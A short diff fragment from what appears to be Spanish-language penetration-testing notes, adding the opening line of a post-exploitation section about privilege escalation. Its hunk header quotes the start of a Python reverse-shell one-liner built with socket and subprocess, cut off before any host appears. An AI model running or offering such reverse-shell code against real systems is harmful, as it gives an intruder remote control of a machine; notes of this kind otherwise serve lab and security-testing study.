@@ -116,3 +116,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 # PostExplotación
 
+Empezamos con la fase de escalada de privilegios.
+
+
+
